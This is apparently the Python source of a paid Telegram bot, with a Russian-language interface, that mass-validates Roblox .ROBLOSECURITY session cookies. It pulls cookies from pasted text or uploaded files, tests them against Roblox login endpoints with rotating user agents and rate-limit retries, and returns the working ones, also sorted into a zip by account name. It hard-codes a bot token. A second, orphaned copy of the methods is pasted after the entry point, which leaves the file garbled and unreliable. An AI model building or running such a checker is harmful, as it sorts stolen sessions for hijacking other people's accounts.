import os
import logging
import re
import random
import time
import requests
import uuid
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from datetime import datetime, timedelta

# Конфигурация
BOT_TOKEN = "7585671071:AAHQqLCFqpC-0Xf1IB965_d33-rPbTAhj8A"

# Тарифы
TARIFFS = {
    'trial': {
        'name': '🆓 Пробный',
        'price_rub': 0,
        'description': '3 дня доступа • ∞ проверок',
        'days': 3,
        'is_trial': True
    },
    '30days': {
        'name': '🥈 30 дней', 
        'price_rub': 50,
        'description': '30 дней доступа • ∞ проверок',
        'days': 30,
        'is_trial': False
    },
    'vip': {
        'name': '🥇 VIP',
        'price_rub': 100,
        'description': 'Навсегда • ∞ проверок',
        'days': 99999,
        'is_trial': False
    }
}

logging.basicConfig(level=logging.INFO)

class UserManager:
    def __init__(self):
        self.users_file = "users.json"
        self.trials_file = "trials.json"
        self.load_data()
    
    def load_data(self):
        """Загрузка данных из файлов"""
        try:
            with open(self.users_file, 'r') as f:
                self.users = json.load(f)
        except:
            self.users = {}
            
        try:
            with open(self.trials_file, 'r') as f:
                self.trials = json.load(f)
        except:
            self.trials = {}
    
    def save_data(self):
        """Сохранение данных в файлы"""
        with open(self.users_file, 'w') as f:
            json.dump(self.users, f, indent=2)
        with open(self.trials_file, 'w') as f:
            json.dump(self.trials, f, indent=2)
    
    def can_use_trial(self, user_id):
        """Может ли пользователь использовать пробный период"""
        return str(user_id) not in self.trials
    
    def activate_trial(self, user_id):
        """Активация пробного периода"""
        expiry_date = datetime.now() + timedelta(days=3)
        self.trials[str(user_id)] = {
            'activated_date': datetime.now().timestamp(),
            'expiry_date': expiry_date.timestamp()
        }
        self.save_data()
        return expiry_date
    
    def add_premium_user(self, user_id, tariff_id):
        """Добавление оплатившего пользователя"""
        tariff = TARIFFS[tariff_id]
        expiry_date = datetime.now() + timedelta(days=tariff['days'])
        
        self.users[str(user_id)] = {
            'tariff': tariff_id,
            'expiry_date': expiry_date.timestamp(),
            'joined_date': datetime.now().timestamp()
        }
        
        if str(user_id) in self.trials:
            del self.trials[str(user_id)]
            
        self.save_data()
    
    def is_user_active(self, user_id):
        """Проверка есть ли у пользователя активная подписка"""
        user_id_str = str(user_id)
        
        if user_id_str in self.users:
            user_data = self.users[user_id_str]
            if datetime.now().timestamp() < user_data['expiry_date']:
                return True
            else:
                del self.users[user_id_str]
                self.save_data()
                return False
        
        if user_id_str in self.trials:
            trial_data = self.trials[user_id_str]
            if datetime.now().timestamp() < trial_data['expiry_date']:
                return True
            else:
                del self.trials[user_id_str]
                self.save_data()
                return False
        
        return False
    
    def get_user_tariff(self, user_id):
        """Получение тарифа пользователя"""
        user_id_str = str(user_id)
        
        if user_id_str in self.users:
            return self.users[user_id_str]['tariff']
        elif user_id_str in self.trials:
            return 'trial'
        else:
            return None

class RobloxCookieChecker:
    def __init__(self):
        self.valid_count = 0
        self.checked_count = 0
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        ]
        self.user_manager = UserManager()
        
    def get_random_user_agent(self):
        return random.choice(self.user_agents)
    
    def make_robust_request(self, url, headers, max_retries=3):
        for attempt in range(max_retries):
            try:
                response = requests.get(url, headers=headers, timeout=15)
                if response.status_code == 429:
                    wait_time = (2 ** attempt) + random.uniform(1, 3)
                    time.sleep(wait_time)
                    continue
                return response
            except:
                if attempt < max_retries - 1:
                    time.sleep(2)
        return None

    def extract_cookies_from_text(self, text):
        """Простое извлечение куки"""
        cookies = []
        
        # Ищем куки по паттерну WARNING
        pattern = r'_\\|WARNING:-DO-NOT-SHARE-THIS[^👤\\s]*'
        matches = re.findall(pattern, text)
        
        for match in matches:
            cookie_text = match.strip()
            if len(cookie_text) > 50 and '_|WARNING:-DO-NOT-SHARE-THIS' in cookie_text:
                cookies.append(cookie_text)
        
        return cookies

    def clean_cookie_string(self, cookie_data):
        return cookie_data.strip()

    def simple_cookie_validation(self, cookie_data):
        """Простая проверка валидности куки"""
        self.checked_count += 1
        
        cookie_clean = self.clean_cookie_string(cookie_data)
        
        if not cookie_clean.startswith('.ROBLOSECURITY='):
            cookie_string = f'.ROBLOSECURITY={cookie_clean}'
        else:
            cookie_string = cookie_clean
            
        headers = {
            'User-Agent': self.get_random_user_agent(),
            'Cookie': cookie_string
        }
        
        try:
            # Проверка через API
            api_url = 'https://users.roblox.com/v1/users/authenticated'
            response = self.make_robust_request(api_url, headers)
            
            if response and response.status_code == 200:
                user_data = response.json()
                if 'id' in user_data and user_data['id'] > 0:
                    self.valid_count += 1
                    return True, cookie_clean
            
            # Проверка через домашнюю страницу
            home_response = self.make_robust_request('https://www.roblox.com/home', headers)
            if home_response and home_response.status_code == 200:
                current_url = home_response.url.lower()
                if 'login' not in current_url and 'signup' not in current_url:
                    self.valid_count += 1
                    return True, cookie_clean
        
        except:
            pass
        
        return False, cookie_clean

    def process_multiple_cookies(self, text, user_id):
        """Обработка куки без игровой статистики"""
        cookies = self.extract_cookies_from_text(text)
        
        print(f"🔍 Найдено куки: {len(cookies)}")
        
        total = len(cookies)
        if total == 0:
            return [], [], "❌ Куки не найдены", ""
        
        # Проверяем доступ
        if not self.user_manager.is_user_active(user_id):
            return [], [], "payment_required", ""
        
        valid_cookies = []
        invalid_cookies = []
        results = []
        
        for i, cookie in enumerate(cookies, 1):
            print(f"🔍 Проверяю куки {i}/{total}")
            is_valid, clean_cookie = self.simple_cookie_validation(cookie)
            
            if is_valid:
                valid_cookies.append(clean_cookie)
                results.append(f"✅ {i}/{total}: Валидная куки")
            else:
                invalid_cookies.append(clean_cookie)
                results.append(f"❌ {i}/{total}: Невалидная куки")
        
        # Простой отчет
        report = f"""🔍 **ОТЧЕТ ПРОВЕРКИ**

• Всего проверено: {total}
• ✅ Валидных: {len(valid_cookies)}
• ❌ Невалидных: {len(invalid_cookies)}
• 📊 Успех: {len(valid_cookies)/total*100:.1f}%"""
        
        return valid_cookies, invalid_cookies, "\n".join(results), report

# Инициализация
checker = RobloxCookieChecker()

def create_payment_keyboard(tariff_id):
    """Клавиатура для оплаты"""
    tariff = TARIFFS[tariff_id]
    crypto_bot_url = f"https://t.me/CryptoBot?start={BOT_TOKEN}_{tariff_id}"
    
    keyboard = [
        [InlineKeyboardButton("💳 Оплатить через CryptoBot", url=crypto_bot_url)],
        [InlineKeyboardButton("✅ Я оплатил", callback_data=f"confirm_{tariff_id}")],
        [InlineKeyboardButton("🔙 Назад", callback_data="show_tariffs")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if checker.user_manager.is_user_active(user_id):
        await update.message.reply_text(
            "✅ У вас есть доступ к боту!\n\n"
            "📁 Отправьте файл с куки для проверки!"
        )
    else:
        keyboard = [
            [InlineKeyboardButton("🆓 Пробный период", callback_data="get_trial")],
            [InlineKeyboardButton("💎 Выбрать тариф", callback_data="show_tariffs")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🔍 **Roblox Cookie Checker**\n\n"
            "Для проверки куки необходим доступ\n\n"
            "🆓 **Пробный:** 3 дня • ∞ проверок\n"
            "💎 **Тарифы:** 50₽ (30 дней) • 100₽ (VIP)\n\n"
            "Выберите опцию:",
            reply_markup=reply_markup
        )

async def get_trial_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    if checker.user_manager.can_use_trial(user_id):
        expiry_date = checker.user_manager.activate_trial(user_id)
        expiry_str = expiry_date.strftime("%d.%m.%Y")
        
        await query.edit_message_text(
            f"🎉 **Пробный период активирован!**\n\n"
            f"✅ Доступ на 3 дня (до {expiry_str})\n"
            f"🔍 Проверки: безлимитно\n\n"
            f"📁 Отправьте файл с куки!"
        )
    else:
        await query.answer("❌ Вы уже использовали пробный период", show_alert=True)

async def show_tariffs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    keyboard = []
    
    if checker.user_manager.can_use_trial(update.effective_user.id):
        keyboard.append([InlineKeyboardButton("🆓 Пробный период - БЕСПЛАТНО", callback_data="get_trial")])
    
    for tariff_id, tariff in TARIFFS.items():
        if tariff_id != 'trial' and tariff['price_rub'] > 0:
            keyboard.append([InlineKeyboardButton(f"{tariff['name']} - {tariff['price_rub']}₽", callback_data=f"buy_{tariff_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "💎 **Тарифы:**\n\n"
        "🆓 **Пробный** - 3 дня • БЕСПЛАТНО\n\n"
        "🥈 **30 дней** - 50₽\n\n"
        "🥇 **VIP** - 100₽ • Навсегда\n\n"
        "💳 Оплата через @CryptoBot",
        reply_markup=reply_markup
    )

async def buy_tariff(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    tariff_id = query.data.replace('buy_', '')
    tariff = TARIFFS.get(tariff_id)
    
    reply_markup = create_payment_keyboard(tariff_id)
    
    await query.edit_message_text(
        f"💎 **Тариф {tariff['name']}**\n\n"
        f"💵 Сумма: {tariff['price_rub']}₽\n"
        f"📅 Срок: {tariff['days']} дней\n"
        f"🔍 Проверки: безлимитно\n\n"
        f"👇 Оплатите через @CryptoBot\n\n"
        f"После оплаты нажмите '✅ Я оплатил'",
        reply_markup=reply_markup
    )

async def confirm_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    tariff_id = query.data.replace('confirm_', '')
    user_id = query.from_user.id
    
    checker.user_manager.add_premium_user(user_id, tariff_id)
    
    await query.edit_message_text(
        f"✅ **Подписка активирована!**\n\n"
        f"Теперь вам доступны все функции бота!\n"
        f"📁 Отправьте файл с куки для проверки."
    )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    if data == "show_tariffs":
        await show_tariffs(update, context)
    elif data == "get_trial":
        await get_trial_command(update, context)
    elif data.startswith("buy_"):
        await buy_tariff(update, context)
    elif data.startswith("confirm_"):
        await confirm_payment(update, context)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if update.message.document or (update.message.text and len(update.message.text) > 100):
        
        if not checker.user_manager.is_user_active(user_id):
            keyboard = [
                [InlineKeyboardButton("🆓 Пробный период", callback_data="get_trial")],
                [InlineKeyboardButton("💎 Тарифы", callback_data="show_tariffs")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                "❌ **Необходим доступ к боту**\n\n"
                "Выберите тариф для проверки куки:",
                reply_markup=reply_markup
            )
            return
        
        if update.message.text:
            text_content = update.message.text
            await update.message.reply_text("🔍 Проверяю куки...")
            
            valid_cookies, invalid_cookies, process_results, report = checker.process_multiple_cookies(text_content, user_id)
            
            if process_results == "payment_required":
                return
            
            await update.message.reply_text(report)
            await send_results(update, user_id, valid_cookies, invalid_cookies)

        elif update.message.document:
            file = await update.message.document.get_file()
            file_path = f"temp_{user_id}.txt"
            await file.download_to_drive(file_path)
            
            with open(file_path, 'r', encoding='utf-8') as f:
                file_content = f.read()
            
            await update.message.reply_text("🔍 Проверяю куки из файла...")
            
            valid_cookies, invalid_cookies, process_results, report = checker.process_multiple_cookies(file_content, user_id)
            
            if process_results == "payment_required":
                os.remove(file_path)
                return
            
            await update.message.reply_text(report)
            await send_results(update, user_id, valid_cookies, invalid_cookies)
            os.remove(file_path)

async def send_results(update, user_id, valid_cookies, invalid_cookies):
    timestamp = datetime.now().strftime("%H%M%S")
    
    if valid_cookies:
        valid_filename = f"valid_{user_id}_{timestamp}.txt"
        with open(valid_filename, 'w', encoding='utf-8') as f:
            for cookie in valid_cookies:
                f.write(cookie + '\n\n')
        
        await update.message.reply_document(
            document=open(valid_filename, 'rb'),
            caption=f"✅ Валидные куки: {len(valid_cookies)} шт."
        )
        os.remove(valid_filename)
    
    if invalid_cookies:
        invalid_filename = f"invalid_{user_id}_{timestamp}.txt"
        with open(invalid_filename, 'w', encoding='utf-8') as f:
            for cookie in invalid_cookies:
                f.write(cookie + '\n\n')
        
        await update.message.reply_document(
            document=open(invalid_filename, 'rb'),
            caption=f"❌ Невалидные куки: {len(invalid_cookies)} шт."
        )
        os.remove(invalid_filename)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, handle_message))
    
    print("🤖 Бот запущен!")
    print("💎 Тарифы: 50₽ (30 дней), 100₽ (VIP)")
    app.run_polling()

if __name__ == "__main__":
    main()    
    def make_robust_request(self, url, headers, max_retries=3):
        """Выполняет запрос с повторными попытками и задержками"""
        for attempt in range(max_retries):
            try:
                response = requests.get(url, headers=headers, timeout=15)
                
                # Проверяем на лимит запросов
                if response.status_code == 429:
                    wait_time = (2 ** attempt) + random.uniform(1, 3)
                    print(f"⚠️ Rate limit hit, waiting {wait_time:.1f}s...")
                    time.sleep(wait_time)
                    continue
                    
                return response
                
            except requests.exceptions.RequestException as e:
                print(f"⚠️ Request error (attempt {attempt + 1}): {e}")
                if attempt < max_retries - 1:
                    wait_time = (2 ** attempt) + random.uniform(1, 2)
                    time.sleep(wait_time)
                    
        return None

    def extract_cookies_from_text(self, text):
        """Извлечение куки из текста"""
        cookies = []
        
        # Метод 1: Поиск по стандартному паттерну
        warning_pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]+(?:\|[^\s]*)*'
        warning_matches = re.findall(warning_pattern, text)
        
        for match in warning_matches:
            cookie_candidate = match.strip()
            if len(cookie_candidate) > 50:
                cookies.append(cookie_candidate)
                print(f"🔍 Найдена куки: {cookie_candidate[:80]}...")
        
        # Метод 2: Обработка одиночной чистой куки
        if not cookies:
            clean_text = text.strip()
            if (len(clean_text) > 300 and 
                '_|WARNING:-DO-NOT-SHARE-THIS' in clean_text and
                'Sharing-this-will-allow-someone-to-log-in-as-you' in clean_text):
                cookies.append(clean_text)
                print(f"🔍 Найдена чистая куки: {clean_text[:80]}...")
        
        return cookies

    def clean_cookie_string(self, cookie_data):
        """Очистка куки"""
        return cookie_data.strip()

    def simple_cookie_validation(self, cookie_data):
        """Проверка валидности куки"""
        self.checked_count += 1
        
        cookie_clean = self.clean_cookie_string(cookie_data)
        
        # Форматируем для использования в запросе
        if not cookie_clean.startswith('.ROBLOSECURITY='):
            cookie_string = f'.ROBLOSECURITY={cookie_clean}'
        else:
            cookie_string = cookie_clean
        
        # Случайный User-Agent для каждого запроса
        user_agent = self.get_random_user_agent()
        headers = {
            'User-Agent': user_agent,
            'Cookie': cookie_string,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com'
        }
        
        # Добавляем небольшую задержку между запросами
        time.sleep(random.uniform(1, 3))
        
        try:
            # Пробуем основной API
            api_url = 'https://users.roblox.com/v1/users/authenticated'
            response = self.make_robust_request(api_url, headers)
            
            if response and response.status_code == 200:
                user_data = response.json()
                if 'id' in user_data and user_data['id'] > 0:
                    username = user_data.get('name', 'Unknown')
                    user_id = user_data['id']
                    self.valid_count += 1
                    return True, cookie_clean, f"✅ VALID - User: {username} (ID: {user_id})", username
                
            # Пробуем mobile API с другим User-Agent
            mobile_headers = headers.copy()
            mobile_headers['User-Agent'] = 'Roblox/iOS'
            mobile_url = 'https://www.roblox.com/mobileapi/userinfo'
            mobile_response = self.make_robust_request(mobile_url, mobile_headers)
            
            if mobile_response and mobile_response.status_code == 200:
                mobile_data = mobile_response.json()
                if 'UserID' in mobile_data and mobile_data['UserID'] > 0:
                    username = mobile_data.get('UserName', 'Unknown')
                    user_id = mobile_data['UserID']
                    self.valid_count += 1
                    return True, cookie_clean, f"✅ VALID - User: {username} (ID: {user_id})", username
            
            # Пробуем домашнюю страницу
            home_response = self.make_robust_request('https://www.roblox.com/home', headers)
            
            if home_response and home_response.status_code == 200:
                current_url = home_response.url.lower()
                if 'login' not in current_url and 'signup' not in current_url:
                    self.valid_count += 1
                    return True, cookie_clean, "✅ VALID - Home page access", "Unknown"
        
        except Exception as e:
            print(f"❌ Ошибка проверки: {e}")
            return False, cookie_clean, f"❌ ERROR - {str(e)}", "Unknown"
        
        return False, cookie_clean, "❌ INVALID - All checks failed", "Unknown"

    def process_multiple_cookies(self, text, user_id):
        """Обработка множественных куки с сохранением для распределения"""
        cookies = self.extract_cookies_from_text(text)
        valid_cookies = []
        invalid_cookies = []
        results = []
        
        print(f"🔍 Найдено куки в тексте: {len(cookies)}")
        
        total = len(cookies)
        if total == 0:
            return [], [], "❌ В тексте не найдено ни одной куки"
        
        # Сохраняем куки для пользователя
        self.user_cookies[user_id] = {
            'all_cookies': cookies,
            'valid_cookies': [],
            'invalid_cookies': [],
            'usernames': []
        }
        
        for i, cookie in enumerate(cookies, 1):
            print(f"🔍 Проверяю куки {i}/{total}")
            is_valid, clean_cookie, status, username = self.simple_cookie_validation(cookie)
            
            if is_valid:
                valid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['valid_cookies'].append(clean_cookie)
                self.user_cookies[user_id]['usernames'].append(username)
                results.append(f"✅ {i}/{total}: {status}")
            else:
                invalid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['invalid_cookies'].append(clean_cookie)
                results.append(f"❌ {i}/{total}: {status}")
        
        return valid_cookies, invalid_cookies, "\n".join(results)

    def create_individual_files(self, user_id):
        """Создание отдельных файлов для каждой куки"""
        if user_id not in self.user_cookies:
            return None
        
        user_data = self.user_cookies[user_id]
        valid_cookies = user_data['valid_cookies']
        usernames = user_data['usernames']
        
        if not valid_cookies:
            return None
        
        # Создаем ZIP архив с отдельными файлами
        import zipfile
        timestamp = datetime.now().strftime("%H%M%S")
        zip_filename = f"individual_cookies_{user_id}_{timestamp}.zip"
        
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for i, (cookie, username) in enumerate(zip(valid_cookies, usernames), 1):
                # Создаем имя файла
                safe_username = re.sub(r'[^\w\-_]', '_', username)
                filename = f"cookie_{i}_{safe_username}.txt"
                
                # Создаем временный файл
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(cookie)
                
                # Добавляем в ZIP
                zipf.write(filename, filename)
                
                # Удаляем временный файл
                os.remove(filename)
        
        return zip_filename

checker = RobloxCookieChecker()

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔍 Бот для проверки Roblox куки активирован\n\n"
        "Простая и быстрая проверка валидности куки.\n\n"
        "Команды:\n"
        "/start - запуск\n"
        "/stats - статистика\n\n"
        "Просто отправьте куки текстом или файлом для проверки."
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats_text = f"""
📊 СТАТИСТИКА ПРОВЕРОК:

• Всего проверено: {checker.checked_count}
• Валидных куки: {checker.valid_count}
• Невалидных: {checker.checked_count - checker.valid_count}
• Процент валидных: {checker.valid_count/max(1, checker.checked_count)*100:.1f}%
"""
    await update.message.reply_text(stats_text)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if update.message.text:
        text_content = update.message.text
        await update.message.reply_text("🔍 Ищу куки в тексте...")
        
        valid_cookies, invalid_cookies, process_results = checker.process_multiple_cookies(text_content, user_id)
        
        if not valid_cookies and not invalid_cookies:
            await update.message.reply_text("❌ Не удалось найти куки в тексте.")
            return
        
        # Создаем клавиатуру с кнопкой распределения
        if valid_cookies:
            keyboard = [
                [InlineKeyboardButton("📁 Распределить по файлам", callback_data="distribute_files")],
                [InlineKeyboardButton("📦 Скачать общий файл", callback_data="download_combined")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            summary = f"""
📋 РЕЗУЛЬТАТЫ:

• Всего обработано: {len(valid_cookies) + len(invalid_cookies)}
• ✅ Валидных: {len(valid_cookies)}
• ❌ Невалидных: {len(invalid_cookies)}
• 📊 Успех: {len(valid_cookies)/(len(valid_cookies) + len(invalid_cookies))*100:.1f}%

Выберите действие:
"""
            await update.message.reply_text(summary, reply_markup=reply_markup)
        else:
            await send_results(update, user_id, valid_cookies, invalid_cookies, process_results)

    elif update.message.document:
        file = await update.message.document.get_file()
        file_path = f"temp_{user_id}.txt"
        await file.download_to_drive(file_path)
        
        with open(file_path, 'r', encoding='utf-8') as f:
            file_content = f.read()
        
        await update.message.reply_text("🔍 Обрабатываю файл...")
        
        valid_cookies, invalid_cookies, process_results = checker.process_multiple_cookies(file_content, user_id)
        
        if not valid_cookies and not invalid_cookies:
            await update.message.reply_text("❌ В файле не найдено куки")
            os.remove(file_path)
            return
        
        # Создаем клавиатуру с кнопкой распределения
        if valid_cookies:
            keyboard = [
                [InlineKeyboardButton("📁 Распределить по файлам", callback_data="distribute_files")],
                [InlineKeyboardButton("📦 Скачать общий файл", callback_data="download_combined")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            summary = f"""
📋 РЕЗУЛЬТАТЫ:

• Всего обработано: {len(valid_cookies) + len(invalid_cookies)}
• ✅ Валидных: {len(valid_cookies)}
• ❌ Невалидных: {len(invalid_cookies)}
• 📊 Успех: {len(valid_cookies)/(len(valid_cookies) + len(invalid_cookies))*100:.1f}%

Выберите действие:
"""
            await update.message.reply_text(summary, reply_markup=reply_markup)
        else:
            await send_results(update, user_id, valid_cookies, invalid_cookies, process_results)
        os.remove(file_path)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик нажатий кнопок"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if query.data == "distribute_files":
        await query.edit_message_text("📁 Создаю отдельные файлы для каждой куки...")
        
        zip_filename = checker.create_individual_files(user_id)
        
        if zip_filename and os.path.exists(zip_filename):
            with open(zip_filename, 'rb') as zip_file:
                await query.message.reply_document(
                    document=zip_file,
                    caption=f"📁 Архив с {len(checker.user_cookies[user_id]['valid_cookies'])} отдельными файлами куки"
                )
            os.remove(zip_filename)
        else:
            await query.message.reply_text("❌ Не удалось создать файлы распределения")
    
    elif query.data == "download_combined":
        await send_results(query, user_id, 
                          checker.user_cookies[user_id]['valid_cookies'], 
                          checker.user_cookies[user_id]['invalid_cookies'], 
                          "")

async def send_results(update, user_id, valid_cookies, invalid_cookies, process_results):
    """Отправка результатов проверки"""
    timestamp = datetime.now().strftime("%H%M%S")
    
    # Сводка
    total = len(valid_cookies) + len(invalid_cookies)
    summary = f"""
📋 РЕЗУЛЬТАТЫ:

• Всего обработано: {total}
• ✅ Валидных: {len(valid_cookies)}
• ❌ Невалидных: {len(invalid_cookies)}
• 📊 Успех: {len(valid_cookies)/total*100:.1f}%
"""
    if hasattr(update, 'message'):
        await update.message.reply_text(summary)
    else:
        await update.edit_message_text(summary)
    
    if valid_cookies:
        valid_filename = f"valid_{user_id}_{timestamp}.txt"
        with open(valid_filename, 'w', encoding='utf-8') as f:
            for cookie in valid_cookies:
                f.write(cookie + '\n\n')
        
        caption = f"✅ ВАЛИДНЫЕ КУКИ: {len(valid_cookies)} шт."
        if hasattr(update, 'message'):
            await update.message.reply_document(
                document=open(valid_filename, 'rb'),
                caption=caption
            )
        else:
            await update.message.reply_document(
                document=open(valid_filename, 'rb'),
                caption=caption
            )
        os.remove(valid_filename)
    
    if invalid_cookies:
        invalid_filename = f"invalid_{user_id}_{timestamp}.txt"
        with open(invalid_filename, 'w', encoding='utf-8') as f:
            for cookie in invalid_cookies:
                f.write(cookie + '\n\n')
        
        if hasattr(update, 'message'):
            await update.message.reply_document(
                document=open(invalid_filename, 'rb'),
                caption=f"❌ НЕВАЛИДНЫЕ КУКИ: {len(invalid_cookies)} шт."
            )
        else:
            await update.message.reply_document(
                document=open(invalid_filename, 'rb'),
                caption=f"❌ НЕВАЛИДНЫЕ КУКИ: {len(invalid_cookies)} шт."
            )
        os.remove(invalid_filename)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("🤖 Бот проверки Roblox куки запущен...")
    print("✅ Бот готов к работе!")
    app.run_polling()

if __name__ == "__main__":
    main()
